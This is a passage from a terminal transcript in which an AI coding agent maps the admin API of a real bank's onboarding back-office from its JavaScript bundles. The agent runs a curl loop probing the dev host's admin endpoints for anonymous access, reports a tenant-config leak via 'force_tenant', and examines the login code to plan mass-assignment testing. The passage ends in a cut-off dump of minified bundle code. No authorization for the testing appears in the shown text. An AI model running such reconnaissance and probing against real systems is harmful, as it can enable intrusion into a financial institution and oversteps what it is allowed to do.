+[chunk_duck-DN-TDdpU.js] "/admin/processlist/process/:id/:process_context/:process_id"
+[chunk_duck-DPln7q39.js] "/admin/api/v1/mailing_lists"
+[chunk_duck-DPln7q39.js] "/admin/mailinglist"
+[chunk_duck-DPln7q39.js] "/admin/mailinglist/mailing_lists/"
+[chunk_duck-DPln7q39.js] "/admin/mailinglist/mailing_lists/:id"
+[chunk_duck-DPln7q39.js] "/admin/mailinglist/mailing_lists/:id/editsign_cases"
+[chunk_duck-DPln7q39.js] "/admin/mailinglist/mailing_lists/:mailingId/editsign_cases/:id"
+[chunk_duck-DPzH84ew.js] "/admin/api/v1/audit_log"
+[chunk_duck-DPzH84ew.js] "/admin/api/v1/auditlog"
+[chunk_duck-DPzH84ew.js] "/admin/api/v1/deletion_log"
+[chunk_duck-DPzH84ew.js] "/admin/auditlog"
+[chunk_duck-DSD41jYZ.js] "/admin/api/v1/rights_and_roles/admin_roles"
+[chunk_duck-DSD41jYZ.js] "/admin/rolemgmtlist"
+[chunk_duck-DWxPQRsW.js] "/admin/api/v1/users/download_basic_info"
+[chunk_duck-DWxPQRsW.js] "/admin/basisinformation"
+[chunk_duck-DYw8WxTc.js] "/admin/api/v1/incoming_wires/calculate_exchange_rate"
+[chunk_duck-DYw8WxTc.js] "/admin/api/v1/users"
+[chunk_duck-DYw8WxTc.js] "/admin/incomingwire"
+[chunk_duck-DYw8WxTc.js] "/admin/incomingwirelist"
+[chunk_duck-DYw8WxTc.js] "/admin/incomingwirelist/:id"
+[chunk_duck-DpYf8Jwo.js] "/admin/userlist"
+[chunk_duck-DpYf8Jwo.js] "/admin/userlist/user/"
+[chunk_duck-DpYf8Jwo.js] "/admin/userlist/user/:id"
+[chunk_duck-HXyLf-up.js] "/admin/api/v1/poa_cases"
+[chunk_duck-HXyLf-up.js] "/admin/poacases"
+[chunk_duck-HXyLf-up.js] "/admin/poacases/:id"
+[chunk_duck-HXyLf-up.js] "/admin/userlist"
+[chunk_duck-Xa9-bmb8.js] "/admin/adminlist"
+[chunk_duck-Xa9-bmb8.js] "/admin/api/v1/admins"
+[chunk_duck-Xa9-bmb8.js] "/admin/api/v1/permissions"
+[chunk_duck-Xa9-bmb8.js] "/admin/api/v1/permissions_sets"
+[chunk_duck-Xa9-bmb8.js] "/admin/permissionlist"
+[chunk_duck-YN3AAbhD.js] "/admin/api/v1/fees"
+[chunk_duck-YN3AAbhD.js] "/admin/bankingfees"
+[chunk_duck-mebH_bqC.js] "/admin/api/v1/editsign_cases"
+[chunk_duck-mebH_bqC.js] "/admin/editandsign"
+[chunk_duck-mebH_bqC.js] "/admin/editandsign/user/"
+[chunk_duck-mebH_bqC.js] "/admin/editandsign/user/:id"
+[chunk_duck-nW5zOEFN.js] "/admin/api/v1/users/import"
+[chunk_duck-nW5zOEFN.js] "/admin/api/v1/users/import/template"
+[chunk_duck-nW5zOEFN.js] "/admin/dataimport"
+[chunk_duck-nW5zOEFN.js] "/admin/userlist"
+[chunk_duck-x8cqs2S2.js] "/admin/documentmgmt"
+[chunk_duck-x8cqs2S2.js] "/api/v1/documentsmanagement"
+[0m
+[0m✗ [0m failed
+[91m[1mError: [0mTool execution aborted
+Now I have the full API surface of the back-office. The JWT-gated `/admin/api/v1/*` endpoints cover: users, rights_and_roles (admin_users/users/tenant_variants/tenant_variant_groups), wallet_accounts, ident_only_cases, search/agree21, users/process_list, mailing_lists, audit_log, deletion_log, users/download_basic_info, incoming_wires/calculate_exchange_rate, poa_cases, admins, permissions, permissions_sets, fees, editsign_cases, users/import.
+
+Let me enumerate which of these are reachable anonymously on the dev sandbox (differential to prod, synthetic data). Let me test the key data endpoints on dev.
+[0m
+[0m$ [0mcd /tmp/opencode/do && for p in "admin/api/v1/users/process_list" "admin/api/v1/ident_only_cases" "admin/api/v1/poa_cases" "admin/api/v1/editsign_cases" "admin/api/v1/wallet_accounts" "admin/api/v1/mailing_lists" "admin/api/v1/fees" "admin/api/v1/admins" "admin/api/v1/permissions" "admin/api/v1/audit_log" "admin/api/v1/search/agree21" "admin/api/v1/rights_and_roles/users" "admin/api/v1/rights_and_roles/admin_roles" "admin/api/v1/rights_and_roles/tenant_variants" "admin/api/v1/users/download_basic_info" "admin/api/v1/incoming_wires/calculate_exchange_rate"; do echo "=== dev /$p ==="; curl -s -k -m 12 -o /tmp/opencode/do/r.txt -w "HTTP %{http_code} size=%{size_download} " "https://digital-onboarding-dev.vpbank.com/$p"; head -c 180 /tmp/opencode/do/r.txt; echo; sleep 0.8; done
+=== dev /admin/api/v1/users/process_list ===
+HTTP 401 size=61 {"message":"invalid token","additional":"Nil JSON web token"}
+=== dev /admin/api/v1/ident_only_cases ===
+HTTP 401 size=61 {"message":"invalid token","additional":"Nil JSON web token"}
+=== dev /admin/api/v1/poa_cases ===
+HTTP 401 size=61 {"message":"invalid token","additional":"Nil JSON web token"}
+=== dev /admin/api/v1/editsign_cases ===
+HTTP 401 size=61 {"message":"invalid token","additional":"Nil JSON web token"}
+=== dev /admin/api/v1/wallet_accounts ===
+HTTP 401 size=61 {"message":"invalid token","additional":"Nil JSON web token"}
+=== dev /admin/api/v1/mailing_lists ===
+HTTP 401 size=61 {"message":"invalid token","additional":"Nil JSON web token"}
+=== dev /admin/api/v1/fees ===
+HTTP 401 size=61 {"message":"invalid token","additional":"Nil JSON web token"}
+=== dev /admin/api/v1/admins ===
+HTTP 401 size=61 {"message":"invalid token","additional":"Nil JSON web token"}
+=== dev /admin/api/v1/permissions ===
+HTTP 401 size=61 {"message":"invalid token","additional":"Nil JSON web token"}
+=== dev /admin/api/v1/audit_log ===
+HTTP 401 size=61 {"message":"invalid token","additional":"Nil JSON web token"}
+=== dev /admin/api/v1/search/agree21 ===
+HTTP 401 size=61 {"message":"invalid token","additional":"Nil JSON web token"}
+=== dev /admin/api/v1/rights_and_roles/users ===
+HTTP 404 size=1793 <!DOCTYPE html>
+<html>
+<head>
+  <title>404 error</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta http-equiv="content-type" content="text/html;
+=== dev /admin/api/v1/rights_and_roles/admin_roles ===
+HTTP 401 size=61 {"message":"invalid token","additional":"Nil JSON web token"}
+=== dev /admin/api/v1/rights_and_roles/tenant_variants ===
+HTTP 401 size=61 {"message":"invalid token","additional":"Nil JSON web token"}
+=== dev /admin/api/v1/users/download_basic_info ===
+HTTP 401 size=61 {"message":"invalid token","additional":"Nil JSON web token"}
+=== dev /admin/api/v1/incoming_wires/calculate_exchange_rate ===
+HTTP 404 size=1793 <!DOCTYPE html>
+<html>
+<head>
+  <title>404 error</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta http-equiv="content-type" content="text/html;
+[0m
+All admin data endpoints are uniformly JWT-gated. The anonymous surface on this app is: `brand` (tenant-config leak via `force_tenant`), `tenants` (dev/stage 200, prod 403), and the login flow. Let me examine the sign-in request format from the bundle (passive) to understand what parameters the login accepts — this determines the mass-assignment testability.
+[0m$ [0mcd /tmp/opencode/do && grep -oE '.{0,80}(doLogin|performLogin|sessionLogin|fetchLogin|LOGIN_REQUEST|email:|password:).{0,120}' index.js | head -20
+a;default:return null}}var xO={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function qy(p){var g=p&&p.no
+r(t){return this._eventProcessors.push(t),this}setUser(t){return this._user=t||{email:void 0,id:void 0,ip_address:void 0,username:void 0},this._session&&yb(this._session,{user:t}),this._notifyScopeListeners
+eturn}const u=a??l?.beforeSendLog,[,d]=wwe(t,n),h={...e.attributes},{user:{id:f,email:v,username:y}}=Rwe(n);Af(h,"user.id",f,!1),Af(h,"user.email",v,!1),Af(h,"user.name",y,!1),Af(h,"sentry.release",i),Af(h,
+i["http.fragment"]=t.hash)),i}function $Z(e,t={},n=xn()){const{message:r,name:i,email:o,url:s,source:a,associatedEventId:l,tags:c}=e,u={contexts:{feedback:{contact_email:o,name:i,message:r,url:s,source:a,as
+quired:l=!1,showEmail:c=!0,showName:u=!0,enableScreenshot:d=!0,useSentryUser:h={email:"email",name:"username"},tags:f,styleNonce:v,scriptNonce:y,colorScheme:b="system",themeLight:S={},themeDark:E={},addScre
+t G=new FormData(ne.target),k=await(c&&H?c.value():void 0),Y={name:xL(G,"name"),email:xL(G,"email"),message:xL(G,"message"),attachments:k?[k]:void 0};if(!Z(Y))return;try{const ee=await i({name:Y.name,email:
+nlineStylesheet:d,maskInputOptions:v===!0?{color:!0,date:!0,"datetime-local":!0,email:!0,month:!0,number:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0,textarea:!0,select:!0}:v===!1?{}:v,maskAt
+I.mousemove=O),pu.reset();const se=y===!0?{color:!0,date:!0,"datetime-local":!0,email:!0,month:!0,number:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0,textarea:!0,select:!0,radio:!0,checkbox:!
+:B});if(this._recordingOptions={maskAllInputs:u,maskAllText:c,maskInputOptions:{password:!0},maskTextFn:K,maskInputFn:K,maskAttributeFn:(J,oe,Z)=>RPe({maskAttributes:_,maskAllText:c,privacyOptions:W,key:J,valu
+s:{userlist:{columns:[{name:"foobar"}]},processlist:{columns:[{name:"foobar"}]},email:{email_sent:!0}},printConfig:!1,apiCallLogging:!1,branding:sMe,...aMe},cMe={basename:"control-center",API_URL:"",printCo
+Effect),e}let ED=!0,BG=!1;const WOe=new S_,jOe={text:!0,search:!0,url:!0,tel:!0,email:!0,password:!0,number:!0,date:!0,month:!0,week:!0,time:!0,datetime:!0,"datetime-local":!0};function KOe(e){const{type:t,
+|e||{},DD="LOGIN",FD="LOGOUT",e4="LOGINIDP",wre="DISMISS_LOGIN_ERROR",t4="FETCH_LOGIN_REQUEST",ST="FETCH_LOGIN_SUCCESS",OD="FETCH_LOGIN_FAILURE",n4="FETCH_IDP_LOGIN_REQUEST",ET="FETCH_IDP_LOGIN_SUCCESS",LD="FETCH_
+EQR_REQUEST:p4,FETCH_GENERATEQR_SUCCESS:xT,FETCH_IDP_LOGIN_FAILURE:LD,FETCH_IDP_LOGIN_REQUEST:n4,FETCH_IDP_LOGIN_SUCCESS:ET,FETCH_LOGIN_FAILURE:OD,FETCH_LOGIN_REQUEST:t4,FETCH_LOGIN_SUCCESS:ST,FETCH_LOGOUT_FAILURE
+s:[s4,a4,l4]})({endpoint:sGe(),endpoint_parameters:t,body:JSON.stringify({user:{email:e}})})},V6e=(e,t,n)=>Ql.createApiAction({method:"POST",finalFormSubmissionCallback:t,types:[c4,u4,d4]})({endpoint:aGe(),
+:null,dismissForgotPassword:$6e,fetchCurrentProfileDetails:J4,fetchIdpLogin:soe,fetchLogin:ooe,fetchLogout:aoe,fetchSecureSession:coe,forgotPassword:H6e,generateQR:loe,generateQRContinueTrigger:U6e,login:N6e,lo
+form-error-required");if(parseFloat(l)>a)return t("form-error-maximum-amount")},email:a=>a&&!/^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,15}$/i.test(a)?t("form-error-invalid-email"):void 0,recommended:a=>a?void 0
+]),F=V.useCallback((oe=!0)=>{e.dismissForgotPassword(),R(oe)},[e]),O=oe=>{const{email:Z}=oe;e.forgotPassword(Z,{redirect_to:encodeURIComponent(`${S}/login`),admin:!0})},B=V.useCallback((oe,Z)=>{e.updatePass
+qat,ui:HUe,tenant:bUe,api:L6e,notifications:EGe,checkboxtree:Qat,compliance:clt,email:glt,devexpress:Mlt};function*Olt(){Dlt&&console.log("!! DEFAULT MODULES SAGAS !!"),yield x_([Gn(D6e),Gn(GUe),Gn(nce),Gn(
+_COLUMNS","MAP_DYNCONF_BROWSER_PROPERTIES_TO_ROWS","DYNCONF_SET_COLUMNS","FETCH_LOGIN_REQUEST","FETCH_LOGIN_SUCCESS","FETCH_LOGIN_FAILURE"],klt=e=>{if(Nlt.indexOf(e.type)===-1)return e;const t={...e,payload:$k};re
+[0m
+Let me find the exact login action body format to see if tenant params are part of the login request.
+[0m$ [0mcd /tmp/opencode/do && grep -oE '.{0,60}(ooe|N6e)(=|:[^=])[^;]{0,300}' index.js | grep -iE 'login|session|tenant|otp|email|password' | head -10; echo "==="; grep -oE 'login:N6e.{0,400}' index.js | head -3
+===
+login:N6e,loginIdp:k6e,logout:B6e,setAvailableModules:uoe,setAvailableRoutes:doe,setIdpTokenProcessed:G6e,updatePassword:V6e},Symbol.toStringTag,{value:"Module"})),W6e=(e,t)=>{switch(t.type){case p4:return{...e,isFetching:!0,errorMessage:null,user:t.payload,qrGenerated:void 0};case xT:{let n;try{n=JSON.parse(t.payload)?.uri}catch(r){console.error("Error parsing QR data:",r),n=null}return{...e,isFetching:!1
+[0m
+[0m$ [0mcd /tmp/opencode/do && grep -oE 'N6e=[^;]{0,400}' index.js; echo "==="; grep -oE 'k6e=[^;]{0,400}' index.js; echo "===ooe==="; grep -oE 'ooe=[^;]{0,500}' index.js
+N6e=(e,t)=>({type:DD,payload:e,meta:{urlParams:t}}),ooe=e=>{const t=Hb.parse(e?.meta?.urlParams)?.locale
+===
+k6e=(e,t)=>({type:e4,payload:e,meta:{urlParams:t}}),soe=e=>Ql.createApiAction({method:"POST",types:[n4,ET,LD]})({endpoint:uGe(),headers:{Authorization:e.payload}}),G6e=e=>({type:r4,payload:e}),aoe=()=>Ql.createApiAction({types:[bre,i4,o4],method:"DELETE"})({endpoint:Sre()}),B6e=()=>({type:FD}),H6e=(e,t)=>{if(!e)throw new Error("Email is required")
+===ooe===
+ooe=e=>{const t=Hb.parse(e?.meta?.urlParams)?.locale
+[0m
+[0m$ [0mcd /tmp/opencode/do && grep -oE '[A-Za-z$_][A-Za-z0-9$_]*=[^;]{0,200}yield[^;]{0,150}Sre\(\)[^;]{0,150}' index.js | head -5; echo "===LOGIN saga==="; grep -oE '.{0,80}case DD.{0,300}' index.js | head -5
+===LOGIN saga===
+[0m
+[0m$ [0mcd /tmp/opencode/do && grep -oE 'DD,ooe|LOGIN_SUCCESS|LOGIN_REQUEST|takeEvery\(DD|takeLatest\(DD|\[DD\]|yield.*Sre\(\)' index.js | sort -u | head; echo "=== context around Sre ==="; grep -oE '.{0,100}Sre\(\).{0,250}' index.js | head -8
+LOGIN_REQUEST
+LOGIN_SUCCESS
+yield Nb(ey.selectForceTenant);h&&(a.endpoint_parameters={...a.endpoint_parameters,force_tenant:h}),yield $n({type:l,meta:e.meta});const f=yield Gn(Dx,t,r,i,a);yield $n({type:c,payload:f,meta:e.meta}),yield Gn(s)}catch(h){const f=w4(h);bte(h,f),console.error("API Error:",r,t,f),yield $n({type:u,payload:f,meta:e.meta,response:h.text});const v=/^\[\d\d\d\]:.*/.test(f)?f.substring(6):f;if(v.trim().startsWith("{"))try{const y=JSON.parse(v);if(!Object.prototype.hasOwnProperty.call(y,"errors"))yield Gn(s);else{const b=Object.keys(y.errors).reduce((S,E)=>{const T=y.errors[E];return{...S,[E]:Array.isArray(T)?T.join(", "):T}},{});Object.keys(b).length?(d=!0,yield Gn(s,b)):yield Gn(s)}}catch(y){yield Gn(s,y)}else yield Gn(s);f==="[401]: invalid token"&&(yield $n(TS.logout())),d||(yield $n(BD.addNotification({message:f,options:{variant:"error"}})))}}var LN={exports:{}},Yj;function qUe(){return Yj||(Yj=1,(function(e,t){(function(n){e.exports=n()})(function(n){var r=["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f"];function i(S,E){var T=S[0],R=S[1],x=S[2],_=S[3];T+=(R&x|~R&_)+E[0]-680876936|0,T=(T<<7|T>>>25)+R|0,_+=(T&R|~T&x)+E[1]-389564586|0,_=(_<<12|_>>>20)+T|0,x+=(_&T|~_&R)+E[2]+606105819|0,x=(x<<17|x>>>15)+_|0,R+=(x&_|~x&T)+E[3]-1044525330|0,R=(R<<22|R>>>10)+x|0,T+=(R&x|~R&_)+E[4]-176418897|0,T=(T<<7|T>>>25)+R|0,_+=(T&R|~T&x)+E[5]+1200080426|0,_=(_<<12|_>>>20)+T|0,x+=(_&T|~_&R)+E[6]-1473231341|0,x=(x<<17|x>>>15)+_|0,R+=(x&_|~x&T)+E[7]-45705983|0,R=(R<<22|R>>>10)+x|0,T+=(R&x|~R&_)+E[8]+1770035416|0,T=(T<<7|T>>>25)+R|0,_+=(T&R|~T&x)+E[9]-1958414417|0,_=(_<<12|_>>>20)+T|0,x+=(_&T|~_&R)+E[10]-42063|0,x=(x<<17|x>>>15)+_|0,R+=(x&_|~x&T)+E[11]-1990404162|0,R=(R<<22|R>>>10)+x|0,T+=(R&x|~R&_)+E[12]+1804603682|0,T=(T<<7|T>>>25)+R|0,_+=(T&R|~T&x)+E[13]-40341101|0,_=(_<<12|_>>>20)+T|0,x+=(_&T|~_&R)+E[14]-1502002290|0,x=(x<<17|x>>>15)+_|0,R+=(x&_|~x&T)+E[15]+1236535329|0,R=(R<<22|R>>>10)+x|0,T+=(R&_|x&~_)+E[1]-165796510|0,T=(T<<5|T>>>27)+R|0,_+=(T&x|R&~x)+E[6]-1069501632|0,_=(_<<9|_>>>23)+T|0,x+=(_&R|T&~R)+E[11]+643717713|0,x=(x<<14|x>>>18)+_|0,R+=(x&T|_&~T)+E[0]-373897302|0,R=(R<<20|R>>>12)+x|0,T+=(R&_|x&~_)+E[5]-701558691|0,T=(T<<5|T>>>27)+R|0,_+=(T&x|R&~x)+E[10]+38016083|0,_=(_<<9|_>>>23)+T|0,x+=(_&R|T&~R)+E[15]-660478335|0,x=(x<<14|x>>>18)+_|0,R+=(x&T|_&~T)+E[4]-405537848|0,R=(R<<20|R>>>12)+x|0,T+=(R&_|x&~_)+E[9]+568446438|0,T=(T<<5|T>>>27)+R|0,_+=(T&x|R&~x)+E[14]-1019803690|0,_=(_<<9|_>>>23)+T|0,x+=(_&R|T&~R)+E[3]-187363961|0,x=(x<<14|x>>>18)+_|0,R+=(x&T|_&~T)+E[8]+1163531501|0,R=(R<<20|R>>>12)+x|0,T+=(R&_|x&~_)+E[13]-1444681467|0,T=(T<<5|T>>>27)+R|0,_+=(T&x|R&~x)+E[2]-51403784|0,_=(_<<9|_>>>23)+T|0,x+=(_&R|T&~R)+E[7]+1735328473|0,x=(x<<14|x>>>18)+_|0,R+=(x&T|_&~T)+E[12]-1926607734|0,R=(R<<20|R>>>12)+x|0,T+=(R^x^_)+E[5]-378558|0,T=(T<<4|T>>>28)+R|0,_+=(T^R^x)+E[8]-2022574463|0,_=(_<<11|_>>>21)+T|0,x+=(_^T^R)+E[11]+1839030562|0,x=(x<<16|x>>>16)+_|0,R+=(x^_^T)+E[14]-35309556|0,R=(R<<23|R>>>9)+x|0,T+=(R^x^_)+E[1]-1530992060|0,T=(T<<4|T>>>28)+R|0,_+=(T^R^x)+E[4]+1272893353|0,_=(_<<11|_>>>21)+T|0,x+=(_^T^R)+E[7]-155497632|0,x=(x<<16|x>>>16)+_|0,R+=(x^_^T)+E[10]-1094730640|0,R=(R<<23|R>>>9)+x|0,T+=(R^x^_)+E[13]+681279174|0,T=(T<<4|T>>>28)+R|0,_+=(T^R^x)+E[0]-358537222|0,_=(_<<11|_>>>21)+T|0,x+=(_^T^R)+E[3]-722521979|0,x=(x<<16|x>>>16)+_|0,R+=(x^_^T)+E[6]+76029189|0,R=(R<<23|R>>>9)+x|0,T+=(R^x^_)+E[9]-640364487|0,T=(T<<4|T>>>28)+R|0,_+=(T^R^x)+E[12]-421815835|0,_=(_<<11|_>>>21)+T|0,x+=(_^T^R)+E[15]+530742520|0,x=(x<<16|x>>>16)+_|0,R+=(x^_^T)+E[2]-995338651|0,R=(R<<23|R>>>9)+x|0,T+=(x^(R|~_))+E[0]-198630844|0,T=(T<<6|T>>>26)+R|0,_+=(R^(T|~x))+E[7]+1126891415|0,_=(_<<10|_>>>22)+T|0,x+=(T^(_|~R))+E[14]-1416354905|0,x=(x<<15|x>>>17)+_|0,R+=(_^(x|~T))+E[5]-57434055|0,R=(R<<21|R>>>11)+x|0,T+=(x^(R|~_))+E[12]+1700485571|0,T=(T<<6|T>>>26)+R|0,_+=(R^(T|~x))+E[3]-1894986606|0,_=(_<<10|_>>>22)+T|0,x+=(T^(_|~R))+E[10]-1051523|0,x=(x<<15|x>>>17)+_|0,R+=(_^(x|~T))+E[1]-2054922799|0,R=(R<<21|R>>>11)+x|0,T+=(x^(R|~_))+E[8]+1873313359|0,T=(T<<6|T>>>26)+R|0,_+=(R^(T|~x))+E[15]-30611744|0,_=(_<<10|_>>>22)+T|0,x+=(T^(_|~R))+E[6]-1560198380|0,x=(x<<15|x>>>17)+_|0,R+=(_^(x|~T))+E[13]+1309151649|0,R=(R<<21|R>>>11)+x|0,T+=(x^(R|~_))+E[4]-145523070|0,T=(T<<6|T>>>26)+R|0,_+=(R^(T|~x))+E[11]-1120210379|0,_=(_<<10|_>>>22)+T|0,x+=(T^(_|~R))+E[2]+718787259|0,x=(x<<15|x>>>17)+_|0,R+=(_^(x|~T))+E[9]-343485551|0,R=(R<<21|R>>>11)+x|0,S[0]=T+S[0]|0,S[1]=R+S[1]|0,S[2]=x+S[2]|0,S[3]=_+S[3]|0}function o(S){var E=[],T;for(T=0;T<64;T+=4)E[T>>2]=S.charCodeAt(T)+(S.charCodeAt(T+1)<<8)+(S.charCodeAt(T+2)<<16)+(S.charCodeAt(T+3)<<24);return E}function s(S){var E=[],T;for(T=0;T<64;T+=4)E[T>>2]=S[T]+(S[T+1]<<8)+(S[T+2]<<16)+(S[T+3]<<24);return E}function a(S){var E=S.length,T=[1732584193,-271733879,-1732584194,271733878],R,x,_,I,F,O;for(R=64;R<=E;R+=64)i(T,o(S.substring(R-64,R)));for(S=S.substring(R-64),x=S.length,_=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],R=0;R<x;R+=1)_[R>>2]|=S.charCodeAt(R)<<(R%4<<3);if(_[R>>2]|=128<<(R%4<<3),R>55)for(i(T,_),R=0;R<16;R+=1)_[R]=0;return I=E*8,I=I.toString(16).match(/(.*?)(.{0,8})$/),F=parseInt(I[2],16),O=parseInt(I[1],16)||0,_[14]=F,_[15]=O,i(T,_),T}function l(S){var E=S.length,T=[1732584193,-271733879,-1732584194,271733878],R,x,_,I,F,O;for(R=64;R<=E;R+=64)i(T,s(S.subarray(R-64,R)));for(S=R-64<E?S.subarray(R-64):new Uint8Array(0),x=S.length,_=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],R=0;R<x;R+=1)_[R>>2]|=S[R]<<(R%4<<3);if(_[R>>2]|=128<<(R%4<<3),R>55)for(i(T,_),R=0;R<16;R+=1)_[R]=0;return I=E*8,I=I.toString(16).match(/(.*?)(.{0,8})$/),F=parseInt(I[2],16),O=parseInt(I[1],16)||0,_[14]=F,_[15]=O,i(T,_),T}function c(S){var E="",T;for(T=0;T<4;T+=1)E+=r[S>>T*8+4&15]+r[S>>T*8&15];return E}function u(S){var E;for(E=0;E<S.length;E+=1)S[E]=c(S[E]);return S.join("")}u(a("hello")),typeof ArrayBuffer<"u"&&!ArrayBuffer.prototype.slice&&(function(){function S(E,T){return E=E|0||0,E<0?Math.max(E+T,0):Math.min(E,T)}ArrayBuffer.prototype.slice=function(E,T){var R=this.byteLength,x=S(E,R),_=R,I,F,O,B;return T!==n&&(_=S(T,R)),x>_?new ArrayBuffer(0):(I=_-x,F=new ArrayBuffer(I),O=new Uint8Array(F),B=new Uint8Array(this,x,I),O.set(B),F)}})();function d(S){return/[\u0080-\uFFFF]/.test(S)&&(S=unescape(encodeURIComponent(S))),S}function h(S,E){var T=S.length,R=new ArrayBuffer(T),x=new Uint8Array(R),_;for(_=0;_<T;_+=1)x[_]=S.charCodeAt(_);return E?x:R}function f(S){return String.fromCharCode.apply(null,new Uint8Array(S))}function v(S,E,T){var R=new Uint8Array(S.byteLength+E.byteLength);return R.set(new Uint8Array(S)),R.set(new Uint8Array(E),S.byteLength),R}function y(S){var E=[],T=S.length,R;for(R=0;R<T-1;R+=2)E.push(parseInt(S.substr(R,2),16));return String.fromCharCode.apply(String,E)}function b(){this.reset()}return b.prototype.append=function(S){return this.appendBinary(d(S)),this},b.prototype.appendBinary=function(S){this._buff+=S,this._length+=S.length;var E=this._buff.length,T;for(T=64;T<=E;T+=64)i(this._hash,o(this._buff.substring(T-64,T)));return this._buff=this._buff.substring(T-64),this},b.prototype.end=function(S){var E=this._buff,T=E.length,R,x=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],_;for(R=0;R<T;R+=1)x[R>>2]|=E.charCodeAt(R)<<(R%4<<3);return this._finish(x,T),_=u(this._hash),S&&(_=y(_)),this.reset(),_},b.prototype.reset=function(){return this._buff="",this._length=0,this._hash=[1732584193,-271733879,-1732584194,271733878],this},b.prototype.getState=function(){return{buff:this._buff,length:this._length,hash:this._hash.slice()}},b.prototype.setState=function(S){return this._buff=S.buff,this._length=S.length,this._hash=S.hash,this},b.prototype.destroy=function(){delete this._hash,delete this._buff,delete this._length},b.prototype._finish=function(S,E){var T=E,R,x,_;if(S[T>>2]|=128<<(T%4<<3),T>55)for(i(this._hash,S),T=0;T<16;T+=1)S[T]=0;R=this._length*8,R=R.toString(16).match(/(.*?)(.{0,8})$/),x=parseInt(R[2],16),_=parseInt(R[1],16)||0,S[14]=x,S[15]=_,i(this._hash,S)},b.hash=function(S,E){return b.hashBinary(d(S),E)},b.hashBinary=function(S,E){var T=a(S),R=u(T);return E?y(R):R},b.ArrayBuffer=function(){this.reset()},b.ArrayBuffer.prototype.append=function(S){var E=v(this._buff.buffer,S),T=E.length,R;for(this._length+=S.byteLength,R=64;R<=T;R+=64)i(this._hash,s(E.subarray(R-64,R)));return this._buff=R-64<T?new Uint8Array(E.buffer.slice(R-64)):new Uint8Array(0),this},b.ArrayBuffer.prototype.end=function(S){var E=this._buff,T=E.length,R=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],x,_;for(x=0;x<T;x+=1)R[x>>2]|=E[x]<<(x%4<<3);return this._finish(R,T),_=u(this._hash),S&&(_=y(_)),this.reset(),_},b.ArrayBuffer.prototype.reset=function(){return this._buff=new Uint8Array(0),this._length=0,this._hash=[1732584193,-271733879,-1732584194,271733878],this},b.ArrayBuffer.prototype.getState=function(){var S=b.prototype.getState.call(this);return S.buff=f(S.buff),S},b.ArrayBuffer.prototype.setState=function(S){return S.buff=h(S.buff,!0),b.prototype.setState.call(this,S)},b.ArrayBuffer.prototype.destroy=b.prototype.destroy,b.ArrayBuffer.prototype._finish=b.prototype._finish,b.ArrayBuffer.hash=function(S,E){var T=l(new Uint8Array(S)),R=u(T);return E?y(R):R},b})})(LN)),LN.exports}var YUe=qUe();const XUe=Xn(YUe),JUe=File.prototype.slice||File.prototype.mozSlice||File.prototype.webkitSlice;class Y4{static create(t,n){new Y4(t).create(n)}constructor(t){if(t.size===void 0)throw new Error("Files without size cannot be checksummed");this.file=t,this.chunkSize=2097152,this.chunkCount=Math.ceil(this.file.size/this.chunkSize),this.chunkIndex=0}create(t){this.callback=t,this.md5Buffer=new XUe.ArrayBuffer,this.fileReader=new FileReader,this.fileReader.addEventListener("load",n=>this.fileReaderDidLoad(n)),this.fileReader.addEventListener("error",n=>this.fileReaderDidError(n)),this.readNextChunk()}fileReaderDidLoad(t){if(this.md5Buffer.append(t.target.result),!this.readNextChunk()){const n=this.md5Buffer.end(!0),r=btoa(n);this.callback(null,r)}}fileReaderDidError(){this.callback(`Error reading ${this.file.name}`)}readNextChunk(){if(this.chunkIndex<this.chunkCount||this.chunkIndex===0&&this.chunkCount===0){const t=this.chunkIndex*this.chunkSize,n=Math.min(t+this.chunkSize,this.file.size),r=JUe.call(this.file,t,n);return this.fileReader.readAsArrayBuffer(r),this.chunkIndex++,!0}else return!1}}const ZUe=e=>new Promise((t,n)=>{Y4.create(e,(r,i)=>r?n(r):t(i))}),QUe=()=>"/rails/active_storage/direct_uploads",e6e=()=>"/admin/api/v1/users",X4=(e,t)=>`/admin/api/v1/users/${e}`,t6e=(e,t)=>`${X4(e)}/emails/${t}`,n6e=e=>`${X4(e)}/emails`,r6e=()=>"/api/v1/tenants",KD={activestorage:QUe,users:e6e,user:X4,getEmail:t6e,sendEmail:n6e,tenantList:r6e},noe="CALL_API_ACTIVESTORAGE";function i6e({types:e,...t}={}){if(!e)throw new Error("Parameter missing: types");if(!Array.isArray(e)||e.length!==4)throw new Error("Parameter invalid: types");for(const n of e)if(typeof n!="string"||!n)throw new Error("Parameter invalid: types");return function(n,r={}){if(!n)throw new Error("Parameter missing: files");let i=n;(i instanceof FileList||Object.prototype.hasOwnProperty.call(i,"length")||Array.isArray(i))&&(i=i[0]);const o={types:e,...t,...r,file:i,started:Date.now()};if(typeof o.path!="string"||!o.path)throw new Error("Parameter missing: path");return{type:noe,meta:o}}}function*o6e(e){const{meta:t}=e,{file:n,types:[r,i,o,s],path:a}=t;try{yield $n({type:r,meta:t});const l=yield Gn(ZUe,n),c={filename:n.name,content_type:n.type||"text",byte_size:n.size,checksum:l};yield $n({type:i,meta:t,payload:{status:"Uploading Descriptor",blobDescriptor:c}});const u=yield Gn(Dx,KD.activestorage(),"POST",JSON.stringify({blob:c})),{direct_upload:{headers:d=[],url:h},signed_id:f}=JSON.parse(u);yield $n({type:i,meta:t,payload:{status:"Uploading File",url:h,headers:d}}),yield Gn(Dx,h,"PUT",n.slice(),{headers:d}),yield $n({type:i,meta:t,payload:{status:"Updating Model",id:f}}),yield Gn(Dx,a,"POST",JSON.stringify({signed_id:f})),yield $n({type:o,meta:t})}catch(l){let c=w4(l);yield $n(BD.addNotification({message:c,options:{variant:"error"}})),yield $n({type:s,meta:t,payload:{error:l,message:l.message}})}}const roe="CALL_API_XHRUPLOAD";function s6e(e,{path:t,...n}){return new Promise((r,i)=>{const o=new 